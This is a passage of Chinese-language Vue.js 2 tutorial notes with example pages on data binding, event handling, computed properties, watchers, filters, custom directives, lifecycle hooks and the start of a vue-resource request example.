                this.intervalId =null
            }
        }

    })
</script>
</body>
</html>
```
* es6 写法
```
在函数的写法上，和=>更改指向上和上没有出入
```
```
  <!-- 1. 导入Vue包 -->
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <!-- 2. 创建一个要控制的区域 -->
  <div id="app">
    <input type="button" value="浪起来" @click="lang">
    <input type="button" value="低调" @click="stop">

    <h4>{{ msg }}</h4>

  </div>

  <script>
    // 注意：在 VM实例中，如果想要获取 data 上的数据，或者 想要调用 methods 中的 方法，必须通过 this.数据属性名  或  this.方法名 来进行访问，这里的this，就表示 我们 new 出来的  VM 实例对象
    var vm = new Vue({
      el: '#app',
      data: {
        msg: '猥琐发育，别浪~~！',
        intervalId: null // 在data上定义 定时器Id
      },
      methods: {
        lang() {
          // console.log(this.msg)
          // 获取到头的第一个字符
          // this

          if (this.intervalId != null) return;

          this.intervalId = setInterval(() => {
            var start = this.msg.substring(0, 1)
            // 获取到 后面的所有字符
            var end = this.msg.substring(1)
            // 重新拼接得到新的字符串，并赋值给 this.msg
            this.msg = end + start
          }, 400)

          // 注意： VM实例，会监听自己身上 data 中所有数据的改变，只要数据一发生变化，就会自动把 最新的数据，从data 上同步到页面中去；【好处：程序员只需要关心数据，不需要考虑如何重新渲染DOM页面】
        },
        stop() { // 停止定时器
          clearInterval(this.intervalId)
          // 每当清除了定时器之后，需要重新把 intervalId 置为 null
          this.intervalId = null;
        }
      }
    })


    // 分析：
    // 1. 给 【浪起来】 按钮，绑定一个点击事件   v-on   @
    // 2. 在按钮的事件处理函数中，写相关的业务逻辑代码：拿到 msg 字符串，然后 调用 字符串的 substring 来进行字符串的截取操作，把 第一个字符截取出来，放到最后一个位置即可；
    // 3. 为了实现点击下按钮，自动截取的功能，需要把 2 步骤中的代码，放到一个定时器中去；
  </script>
</body>

</html>
```
>[danger] ##### 双向绑定计算器案例 -- v-model
![](https://box.kancloud.cn/c22a08f47a6abf4ad0321c964fd54548_470x61.png)
```
1.使用v-model ，针对select 和input
```
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    <input type="text" v-model="input1">
    <select v-model="opt">
        <option value="+">+</option>
        <option value="-">-</option>
        <option value="*">*</option>
        <option value="/">/</option>
    </select>
    <input type="text" v-model="input2">
    <input type="button" @click="calc" value="计算">
    <span >{{ result }}</span>
</div>
<script>
    var vm = new Vue({
        el:'#app',
        // data 负责输出理数据的
        data:{
            input1:"0",
            opt:"+",
            input2:"0",
            result:"0",

        },
        // methods 负责处理调用方法的
        methods:{
            calc(){
                switch (this.opt) {
                    case '+':
                        this.result = parseInt(this.input1) + parseInt(this.input2)
                        break;
                    case '-':
                        this.result = parseInt(this.input1) - parseInt(this.input2)
                        break;
                    case '*':
                        this.result = parseInt(this.input1) * parseInt(this.input2)
                        break;
                    case '/':
                        this.result = parseInt(this.input1) / parseInt(this.input2)
                        break;
            }
            // // 注意：这是投机取巧的方式，正式开发中，尽量少用
          // var codeStr = 'parseInt(this.input1) ' + this.opt + ' parseInt(this.input2)'
          // this.result = eval(codeStr)
            }
        }

    })
</script>
</body>
</html>
```
>[success] # 点击变色
```
1.点击变色，一定要找到唯一变量，进行唯一变量更改，实现变色
```
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">
<script type="text/javascript" src="lib/vue.js"></script>
<style>
    .active{
        background-color: red;
    }
</style>
</head>
<body>
    <div id="box" >
       <ul>
           <li v-for="i,index in list" :class="index==colorindex?'active':''" @click="clickli(index)">{{i}}</li>
       </ul>
    </div>
    <script type="text/javascript">
    	var vm = new Vue({
            el:"#box",
            data:{
                colorindex:0,
                list:["11","22","333"]
            },
            methods:{
                clickli(index){
                    this.colorindex = index
                }

            }            
        })
    	
    </script>
    <script>
    </script>
</body>
</html>
```
>[success] # 最简单的增删改查思路
```
1.在做删除和标记类似需求时候一定要先想找到他们唯一的变量作为方法的参数进行计算
2.通过list[index] 这种脚标改变list ，在vue中是监听不到数组的改变的，利用splice 进行操作
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
    <input type="text" v-model="mytext">
    <button @click = "handleClick">提交</button>
    <ul>
        <li v-for="(data,index) in list">
            <span :class="data.isMarked?'red':''"> {{data.content}}</span>

            <button  @click="handleDelClick(index)">del</button>
            <button @click="handleMarkClick(data)">mark</button>

        </li>
    </ul>

</div>
<script type="text/javascript">
    var vm = new Vue({
        el:"#box",

        data:{
            mytext:"",
            list:[]
        },
        methods:{
            handleClick(){
                this.list.push({
                    content:this.mytext,
                    isMarked:false
                });
                this.mytext = ""
            },
            handleDelClick(index){
                this.list.splice(index,1)
            },
            handleMarkClick(data){
                console.log(data);
                data.isMarked = !data.isMarked;

                // this.list[index].isMarked
            }
        }
    })
</script>
</body>
</html>
```
>[success] # 综合案例
```
1.在for循环的时候记得绑定key
2.因为可以搜索所以数据存储的列表是改变的用一个search方法根据数组展示
```
```
  <script src="./lib/vue-2.4.0.js"></script>
  <link rel="stylesheet" href="./lib/bootstrap-3.3.7.css">
</head>
<body>
  <div id="app">
    <div class="panel panel-primary">
      <div class="panel-heading">
        <h3 class="panel-title">添加品牌</h3>
      </div>
      <div class="panel-body form-inline">
        <label>
          Id:
          <input type="text" class="form-control" v-model="id">
        </label>
        <label>
          Name:
          <input type="text" class="form-control" v-model="name">
        </label>

        <!-- 在Vue中，使用事件绑定机制，为元素指定处理函数的时候，如果加了小括号，就可以给函数传参了 -->
        <input type="button" value="添加" class="btn btn-primary" @click="add()">

        <label>
          搜索名称关键字：
          <input type="text" class="form-control" v-model="keywords">
        </label>
      </div>
    </div>



    <table class="table table-bordered table-hover table-striped">
      <thead>
        <tr>
          <th>Id</th>
          <th>Name</th>
          <th>Ctime</th>
          <th>Operation</th>
        </tr>
      </thead>
      <tbody>
        <!-- 之前， v-for 中的数据，都是直接从 data 上的list中直接渲染过来的 -->
        <!-- 现在， 我们自定义了一个 search 方法，同时，把 所有的关键字，通过传参的形式，传递给了 search 方法 -->
        <!-- 在 search 方法内部，通过 执行 for 循环， 把所有符合 搜索关键字的数据，保存到 一个新数组中，返回 -->
        <tr v-for="item in search(keywords)" :key="item.id">
          <td>{{ item.id }}</td>
          <td v-text="item.name"></td>
          <td>{{ item.ctime }}</td>
          <td>
            <a href="" @click.prevent="del(item.id)">删除</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>
  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        id: '',
        name: '',
        keywords: '', // 搜索的关键字
        list: [
          { id: 1, name: '奔驰', ctime: new Date() },
          { id: 2, name: '宝马', ctime: new Date() }
        ]
      },
      methods: {
        add() { // 添加的方法
          // console.log('ok')
          // 分析：
          // 1. 获取到 id 和 name ,直接从 data 上面获取 
          // 2. 组织出一个对象
          // 3. 把这个对象，调用 数组的 相关方法，添加到 当前 data 上的 list 中
          // 4. 注意：在Vue中，已经实现了数据的双向绑定，每当我们修改了 data 中的数据，Vue会默认监听到数据的改动，自动把最新的数据，应用到页面上；

          // 5. 当我们意识到上面的第四步的时候，就证明大家已经入门Vue了，我们更多的是在进行 VM中 Model 数据的操作，同时，在操作Model数据的时候，指定的业务逻辑操作；
          var car = { id: this.id, name: this.name, ctime: new Date() }
          this.list.push(car)
          this.id = this.name = ''
        },
        del(id) { // 根据Id删除数据
          // 分析：
          // 1. 如何根据Id，找到要删除这一项的索引
          // 2. 如果找到索引了，直接调用 数组的 splice 方法

          /* this.list.some((item, i) => {
            if (item.id == id) {
              this.list.splice(i, 1)
              // 在 数组的 some 方法中，如果 return true，就会立即终止这个数组的后续循环
              return true;
            }
          }) */


          var index = this.list.findIndex(item => {
            if (item.id == id) {
              return true;
            }
          })

          // console.log(index)
          this.list.splice(index, 1)
        },
        search(keywords) { // 根据关键字，进行数据的搜索
          /* var newList = []
          this.list.forEach(item => {
            if (item.name.indexOf(keywords) != -1) {
              newList.push(item)
            }
          })
          return newList */

          // 注意：  forEach   some   filter   findIndex   这些都属于数组的新方法，
          //  都会对数组中的每一项，进行遍历，执行相关的操作；返回一个新数组
          return this.list.filter(item => {
            // if(item.name.indexOf(keywords) != -1)

            // 注意 ： ES6中，为字符串提供了一个新方法，叫做  String.prototype.includes('要包含的字符串')
            //  如果包含，则返回 true ，否则返回 false
            //  contain
            if (item.name.includes(keywords)) {
              return item
            }
          })

          // return newList
        }
      }
    });
  </script>
</body>

</html>
```
>[success] # 简单的购物车案例
```
1.用了计算属性去监听
2.用了多选框机制 ，用数组保存多选内容
```
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
   <ul>
       <li v-for="i in datalist" :key="i.id">
           <input type="checkbox" v-model="checkgroup" :value="i"> {{i}}
           <button @click="i.number++">add</button>
           <button @click="handleDelClick(i)">del</button>
       </li>
   </ul>
    <p>总金额 {{computedSum}}</p>


</div>
<script type="text/javascript">
    var vm = new Vue({
        el:"#box",

        data:{
            datalist:[
                {
                    name:"商品1",
                    price:10,
                    number:1,
                    id:"1"
                },
                {
                    name:"商品2",
                    price:20,
                    number:2,
                    id:"2"
                },
                {
                    name:"商品3",
                    price:30,
                    number:3,
                    id:"3"
                }

            ],
            checkgroup:[],

        },
        methods:{
            handleDelClick(data){
                data.number= data.number<=1?1:--data.number;

            }
        },
        computed:{
          computedSum(){
              var sum = 0;
              this.checkgroup.forEach((item,index)=>{
                  sum += item.price*item.number
              })
              return sum
          }
        },

    })
</script>
</body>
</html>
```
[TOC]

 
>[success] # 监听事件改变
```
1.利用keyup键盘事件抬起改变，通过监听键盘抬起事件改变内容
2.利用watch 监听，监听的是属性，根据属性变更监听触发事件，所以watch中的方法名称对应属性名称
3.利用computed 属性重新计算，他就是一个方法，不过返回的是一个值，
他可以监听到他和他方法命一样的属性改变，根据改变去改变对应内容，延伸计算属性可以赋值，但不建议具体用法见文档
4.当 {{}}里面出现了复杂的逻辑算法的时候可以考虑computed
```
* 三者区别
```
1.computed属性的结果会被缓存，除非依赖的响应式属性变化才会重新计算。主要当作属性来使用；

只要依赖的状态发生改变， 计算属性会再次计算一遍
2.methods方法表示一个具体的操作，主要书写业务逻辑methods为什么不能作为
计算属性替代品，因为计算属性监听内容改变才重新计算，但methods调用就计算，如果大量使用对属性的重新赋值的地方会小号性能

3.watch一个对象，键是需要观察的表达式，值是对应回调函数。主要用来监听某
些特定数据的变化，从而进行某些具体的业务逻辑操作；可以看作是computed和
methods的结合体；

4.computed 和watch methods，前两者不用绑定事件执行，后者需要绑定事件才能执行
```
>[danger] ##### 拼接名字案例 --- @keyup
![](https://box.kancloud.cn/9d456bcf4221e8a18e7fc416ec16dafd_564x46.png)
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">

    <input type="text" v-model="firstname" @keyup="getFullname"> +
    <input type="text" v-model="lastname" @keyup="getFullname"> =
    <input type="text" v-model="fullname">

  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        firstname: '',
        lastname: '',
        fullname: ''
      },
      methods: {
        getFullname() {
          this.fullname = this.firstname + '-' + this.lastname
        }
      }
    });
  </script>
</body>

</html>
```
>[danger] ##### 第二种利用watch 监视元素属性
```
1.watch 中的方法名对应的是data中的数据名称
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">

    <input type="text" v-model="firstname"> +
    <input type="text" v-model="lastname"> =
    <input type="text" v-model="fullname">

  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        firstname: '',
        lastname: '',
        fullname: ''
      },
      methods: {},
      watch: { // 使用这个 属性，可以监视 data 中指定数据的变化，然后触发这个 watch 中对应的 function 处理函数
        'firstname': function (newVal, oldVal) {
          // console.log('监视到了 firstname 的变化')
          // this.fullname = this.firstname + '-' + this.lastname

          // console.log(newVal + ' --- ' + oldVal)

          this.fullname = newVal + '-' + this.lastname
        },
        'lastname': function (newVal) {
          this.fullname = this.firstname + '-' + newVal
        }
      }
    });
  </script>
</body>

</html>
```
>[danger] ##### computed 属性重新计算
```
1.必须return 返回
2.对应的方法名称是data数据对应名称
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">

    <input type="text" v-model="firstname"> +
    <input type="text" v-model="middlename"> +
    <input type="text" v-model="lastname"> =
    <input type="text" v-model="fullname">

    <p>{{ fullname }}</p>
    <p>{{ fullname }}</p>
    <p>{{ fullname }}</p>

  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        firstname: '',
        lastname: '',
        middlename: ''
      },
      methods: {},
      computed: { // 在 computed 中，可以定义一些 属性，这些属性，叫做 【计算属性】， 计算属性的，本质，就是 一个方法，只不过，我们在使用 这些计算属性的时候，是把 它们的 名称，直接当作 属性来使用的；并不会把 计算属性，当作方法去调用；

        // 注意1： 计算属性，在引用的时候，一定不要加 () 去调用，直接把它 当作 普通 属性去使用就好了；
        // 注意2： 只要 计算属性，这个 function 内部，所用到的 任何 data 中的数据发送了变化，就会 立即重新计算 这个 计算属性的值
        // 注意3： 计算属性的求值结果，会被缓存起来，方便下次直接使用； 如果 计算属性方法中，所以来的任何数据，都没有发生过变化，则，不会重新对 计算属性求值；
        'fullname': function () {
          console.log('ok')
          return this.firstname + '-' + this.middlename + '-' + this.lastname
        }
      }
    });
  </script>
</body>

</html>
```
>[success] # 利用watch 监听路由
```
1.利用watch 监听一些非dom事件
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <!-- 1. 导入包 -->
  <script src="./lib/vue-router-3.0.1.js"></script>
</head>

<body>
  <div id="app">
    <router-link to="/login">登录</router-link>
    <router-link to="/register">注册</router-link>

    <!-- 容器 -->
    <router-view></router-view>

  </div>

  <script>
    // 2. 创建子组件
    var login = {
      template: '<h3>这是登录子组件，这个组件是 奔波霸 开发的。</h3>'
    }

    var register = {
      template: '<h3>这是注册子组件，这个组件是 霸波奔 开发的。</h3>'
    }

    // 3. 创建一个路由对象
    var router = new VueRouter({
      routes: [ // 路由规则数组
        { path: '/', redirect: '/login' },
        { path: '/login', component: login },
        { path: '/register', component: register }
      ],
      linkActiveClass: 'myactive' // 和激活相关的类
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      // router: router
      router,
      watch: {
        //  this.$route.path
 是监听的指定属性
        '$route.path': function (newVal, oldVal) {
          // console.log(newVal + ' --- ' + oldVal)
          if (newVal === '/login') {
            console.log('欢迎进入登录页面')
          } else if (newVal === '/register') {
            console.log('欢迎进入注册页面')
          }
        }
      }
    });
  </script>
</body>

</html>
```
>[success] # 利用watch 和computed 案例
```
1.第一点watch 需要监听可能改变的属性，他的方法名就是对应的属性名称，而且里面有两个参数分别是，改变后的参数，和改变前的参数
2.computed 作为属性，一定要有返回值
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
    <input v-model="price">
    <input v-model="num">
    <!--利用计算属性监听 是单独返回用return 相当于一个新的属性-->
    <input v-model="computedSum">

    <!--利用watch 监听 -->
    {{sum}}

</div>
<script type="text/javascript">
    var vm = new Vue({
        el:"#box",

        data:{
           price:"",
            num:"",
            sum:""
        },
        methods:{

        },
        watch:{
            //之监听对应的属性，根据属性改变
            price(newVal, oldVa){
                this.sum = newVal *this.num
            },
            num(newVal,oldVal){
                this.sum = newVal *this.price

            }
        },

        computed:{
            computedSum(){
                //监听内部对应的属性 num 和price改变,要用return 返回
               return  this.price * this.num
            }
        }
    })
</script>
</body>
</html>
```
>[success] # 利用computed 进行模糊查询
```、
1.和综合案例中查询不同，综合案例写在方法中，因此方法
中的操作，不能去改变原来列表，如果改变就会出现，新的列表和原来的列表不同的情况
```
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
    <input v-model="search">
   <ul>
       <li v-for="i in computedSearch">
           {{i}}
       </li>
   </ul>

</div>
<script type="text/javascript">
    var vm = new Vue({
        el:"#box",

        data:{
            search:"",
            list:["aa","abb","ccc"]
        },

        computed:{
            computedSearch(){
               return  this.list.filter(item=>{
                   return item.indexOf(this.search) !=-1


               })
            }
        }
    })
</script>
</body>
</html>
```
[TOC]
>[success] # Vue 的过滤器
```
1.Vue.js 允许你自定义过滤器，可被用作一些常见的文本格式化。过滤器可以
 用在两个地方：大胡子语法插值和 v-bind 表达式。过滤器应该被添加在
 JavaScript 表达式的尾部，由“管道”符指示；
```
>[danger] ##### 定义全局过滤器 --  Vue.filter
```
1.使用 Vue.filter 创建全局过滤器
2.过滤器中的一个参数是，全局过滤器的函数名，第二个参数函数中的第一
个参数是被过滤函数，后面的参数是传入的参数
3.过滤器可以叠加使用
```
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    <!--在大胡子语法使用-->
    <p>{{ msg| msgFormat|msgFormat2('参数1', '参数2') }}</p>

    <!--在bind 语法使用-->
    <p :data="msg|msgFormat"></p>
</div>
<script>

    /** Vue.filter 全局过滤器，第一个参数是过滤器函数，
     *  第二个参数函数，第一个参数是过滤内容，后面的是函数接受值
     */
    Vue.filter('msgFormat', function (msg) {
        return msg.replace(/是/g,'恩')
    })

    // 过滤器可以传多个参数，可以叠加使用
    Vue.filter('msgFormat2',function (msg,arg1,arg2) {
        return msg+arg1+arg2
    })

    var vm = new Vue({
        el:'#app',
        data:{
            msg:"我是测试过滤器的语句是"
        },
        methods:{}
    })
</script>
</body>
</html>
```
>[danger] ##### 私有过滤器  -- filters
```
1.私有过滤器仅局限于当前vue 对象
2.全局过滤器是对所有创建的vue对象都好用
3.私有有s，全局没有
4. 过滤器调用的时候，采用的是就近原则，如果私有过滤器和全局过滤器名称一致了，这时候 优先调用私有过滤器

```
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    <!--在大胡子语法使用-->
    <p>{{ msg|msgFormat2('参数1', '参数2') }}</p>

</div>
<script>


    var vm = new Vue({
        el:'#app',
        data:{
            msg:"我是测试过滤器的语句是"
        },
        methods:{},
        filters:{
            msgFormat2:function (msg,arg1,arg2) {
                return msg+arg1+arg2

            }
        }
    })
</script>
</body>
</html>
```
>[success] # 自定义组件 -- directive
<a href="https://cn.vuejs.org/v2/guide/custom-directive.html">文档说明</a>
```
1.根据文档上介绍除了核心功能默认内置的指令 (v-model 和 v-show)，Vue 
也允许注册自定义指令。注意，在 Vue2.0 中，代码复用和抽象的主要形式是
组件。然而，有的情况下，你仍然需要对普通 DOM 元素进行底层操作，这时
候就会用到自定义指令。
```
>[danger] ##### 细节总结
```
1. Vue.directive()  第一个参数是自定义指令的名称，第二参数是一个对象
,对象中有五个方法bind,inserted,update,componentUpdated,unbind,其中
五个方法中有三个参数el,binding,vnode(vnode.context)
2.其中常用的三个方法讲解
 2.1.bind 主要针对样式，因为此时还没有创建dom ，可以做一些不需要dom
     节点的事情，将来元素肯定会显示到页面中，这时候，浏览器的渲染引擎
     必然会解析样式，应用给这个元素比如样式更改
 2.2.inserted和JS行为有关的操作，此时已经创建好了dom，所以js操作最好在
     inserted 中去执行，防止JS行为不生效
 2.3.updated 是当vue中的属性发生改变时候，去执行
3.以上三个函数中第一个参数 el，指的是当前拥有该属性的dom,
例如现在绑定在一个<input  v-self>这个自定义的v-self 的el就是整个input的
dom，binding可以获取指令绑定时候的传值binding.value(一些具体见官方文档) ，
vnode获取当前dom 绑定的vue一些值，使用context才可以 
  编译生成的虚拟节点。移步 VNode API 来了解更多详情。
```
>[success] # 定义全局自定义组件 -- directive
```
1.使用 Vue.directive() 定义全局的指令
2.第一参数是自定义组件名称
3.第二个参数是一个对象，这个对象身上，有一些指令相关的函数，这些函数
可以在特定的阶段，执行相关的操作
4.使用的时候v - 自定义的变量名
5.其中bind，inserted 是只调用一次，update是一些 属性重新生调用
```
>[danger] ##### 自定义获取焦点 和改变字体颜色的案例
```
1.传参接受的时候binding.value
2.在很多时候，你可能想在 bind 和 update 时触发相同行为，而不关心其它的钩子。比如这样写:
Vue.directive('color-swatch', function (el, binding) {
  el.style.backgroundColor = binding.value
})
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script type="text/javascript" src="lib/vue.js"></script>
</head>
<body>
    <div id="app">
        <!--点击按钮触发改变颜色属性-->
        <input type="button" value="改变颜色属性" @click="color='yellow'">

        <!--此时的red 加的单引号相当于是一个值传入-->
        <input type="text" v-color="'red'">
        <!--此时的red 没有加是因为此时是获取vue中的参数-->
        <input type="text" v-color="color">

        <!--这个改变颜色自定义事件触发的是updated 在vue中data 改变时候改变当前元素-->
        <input type="text" v-changecolor="color">
        <input type="text" v-focus>
    </div>
<script>
    Vue.directive('color',
        {
            // 1.el 是被绑定的当前元素 2.binding 是接受指令的参数
            bind:function (el,binding) {
                // 还没有创建dom ，可以做一些不需要dom节点的事情，比如样式更改
                // el.style.color = 'red'
                el.style.color= binding.value
            },

        }
    );
    Vue.directive('focus',{
       inserted:function (el,binding) {
           // 创建了dom 对象，可以做一些dom的操作，
           console.log(el)
           el.focus()
       }
    });
    Vue.directive('changecolor',{
        update:function (el,binding) {
            // vue 中元素改变后才会改变
            el.style.color= binding.value
        }
    });



    Vue.directive('color',
        {
            // 1.el 是被绑定的当前元素 2.binding 是接受指令的参数
            bind:function (el,binding) {
                // 还没有创建dom ，可以做一些不需要dom节点的事情，比如样式更改
                // el.style.color = 'red'
                el.style.color= binding.value
            },
            update:function (el,binding) {
                // vue 中元素改变后才会改变
                el.style.color= binding.value
            }
        }
    );
    var vm = new Vue({
        el:"#app",
        data:{
            color:'red'
        },
    })

</script>
</body>
</html>
```
>[success] # 使用
```
1.当不用自定义 指令的时候一定要在直接使用this.$nextTick，来处理引入dom对象的js
2.使自定义组件的时候可以使用，组件函数对象中的参数vnode，获取当前绑定指令标签的
list，在最后一次list生成新的dom对象
```
>[danger] ##### 不用自定义指令
> 
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script type="text/javascript" src="lib/vue.js"></script>

    <!--引入轮播-->
    <link href="dist/css/swiper.css" rel="stylesheet">
    <script type="text/javascript" src="dist/js/swiper.js"></script>
</head>
<body>
    <div id="app">
        <div class="swiper-container">
            <div class="swiper-wrapper">
                {{list}}
                <div class="swiper-slide" v-for="data in list" >{{data}}</div>
            </div>
            <!-- 如果需要分页器 -->
            <div class="swiper-pagination"></div>
        </div>
    </div>
<script>

    var vm = new Vue({
        el:"#app",
        data:{
            list:[],
        },
        created(){

        },
        mounted() {
            setTimeout(() => {
                this.list = ["slide1", "slide2", "silde3"]

                // 这个函数中执行的时间 等待上面数据更新到dom节点中，才会执行
                this.$nextTick(() => {
                    new Swiper('.swiper-container', {
                        autoplay: 2000,
                        loop: true,
                        pagination: ".swiper-pagination"
                    })
                }, 1000);

            })
        }})
</script>
</body>
</html>
```
>[danger] ##### 使用自定义指令
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<!-- <link href="lib/swiper/css/swiper.css" rel="stylesheet"> -->

<script type="text/javascript" src="lib/vue.js"></script>
<link href="dist/css/swiper.css" rel="stylesheet">

<script type="text/javascript" src="dist/js/swiper.js"></script>
</head>
<body>
    <div id="box">
          <div class="swiper-container">
              <div class="swiper-wrapper">
                  <div class="swiper-slide" v-for="(data,index) in list" v-swipe="index">{{data}}</div>
              </div>
              <div class="swiper-pagination"></div>
          </div>
    </div>  

    <script type="text/javascript">
        
      Vue.directive("swipe",{ 

        inserted(el,binding,vnode){
          if(vnode.context.list.length-1 ===binding.value){
          new Swiper('.swiper-container',{
            autoplay:2000,
            loop:true,
            pagination:".swiper-pagination"
          })
          }
        }
      })


      new Vue({
        el:"#box",
        data:{
          list:[],
          name:"kerwin"
        },
        mounted(){
          //ajax
          setTimeout(() => {
            this.list=["slide1","slide2","silde3"]
            //数据赋值完后， dom 异步更新 ，
            
          }, 1000)
        }
      })
       
    </script>
</body>
</html>
```
 
>[success] # 局部使用
```
1.创建实例时候，调用directives
    var vm = new Vue({
        el:'#app',
        data:{
            msg:"变色"
        },
        directives: { // 自 定义私有指令
           
        }
    })
```
>[danger] ##### 更改字体粗细
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    <span v-text="msg" v-fontweight="900"></span>
</div>
<script>


    var vm = new Vue({
        el:'#app',
        data:{
            msg:"变色"
        },

        directives: { // 自 定义私有指令
            'fontweight': { // 设置字体粗细的
                bind: function (el, binding) {
                    el.style.fontWeight = binding.value
                }
            },
        }
    })
</script>
</body>
</html>
```
>[success] # Vue的生命周期
 [vue实例的生命周期](https://cn.vuejs.org/v2/guide/instance.html#实例生命周期)
[生命周期钩子](https://cn.vuejs.org/v2/api/#选项-生命周期钩子)
![](https://box.kancloud.cn/e374533874ae3d7e1c4958e407128be3_2498x2798.png)
```
1.从Vue实例创建、运行、到销毁期间，总是伴随着各种各样的事件，这些事件，统称为生命周期
2.生命周期钩子就是生命周期事件的别名而已；
3.生命周期钩子 = 生命周期函数 = 生命周期事件
```

>[danger] ##### 主要的生命周期函数分类
```
创建期间的生命周期函数：
  	+ beforeCreate：实例刚在内存中被创建出来，此时，还没有初始化好 data 和 methods 属性
  	+ created：实例已经在内存中创建OK，此时 data 和 methods 已经创建OK，此时还没有开始 编译模板
  	+ beforeMount：此时已经完成了模板的编译，但是还没有挂载到页面中
  	+ mounted：此时，已经将编译好的模板，挂载到了页面指定的容器中显示
 - 运行期间的生命周期函数：
 	+ beforeUpdate：状态更新之前执行此函数， 此时 data 中的状态值是最新的，但是界面上显示的 数据还是旧的，因为此时还没有开始重新渲染DOM节点
 	+ updated：实例更新完毕之后调用此函数，此时 data 中的状态值 和 界面上显示的数据，都已经完成了更新，界面已经被重新渲染好了！
 - 销毁期间的生命周期函数：
 	+ beforeDestroy：实例销毁之前调用。在这一步，实例仍然完全可用。
 	+ destroyed：Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。
```
>[danger] ##### 另一种生命周期的说法
```
        beforeCreate(){
          console.log("beforeCreate")
        },

        created(){
          console.log("created")

        },

        beforeMount(){
          console.log("beforeMount")
          //ajax 异步
        },

        mounted(){
          console.log("mounted")
          // 监听事件  ，获取dom ，ajax
          // 开启定时器
        },


        beforeUpdate(){
          console.log("beforeUpdate")

        },

        updated(){
          console.log("updated")
          // 更新后真实dom 可以访问了。
          // 22222
        },

        beforeDestroy(){
          console.log("beforeDestroy")

        },

        destroyed(){
          console.log("destroyed")
          //取消定时器， 解绑事件
        }
       }

```
>[success] # 使用vue-resource 包进行异步
## [vue-resource 实现 get, post, jsonp请求](https://github.com/pagekit/vue-resource)

>[danger] ##### 案例 
```
  <script src="./lib/vue-2.4.0.js"></script>
  <!-- 注意：vue-resource 依赖于 Vue，所以先后顺序要注意  -->
  <!-- this.$http.jsonp -->
  <script src="./lib/vue-resource-1.3.4.js"></script>
</head>

<body>
  <div id="app">
    <input type="button" value="get请求" @click="getInfo">
    <input type="button" value="post请求" @click="postInfo">
    <input type="button" value="jsonp请求" @click="jsonpInfo">
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {
        getInfo() { // 发起get请求
          //  当发起get请求之后， 通过 .then 来设置成功的回调函数
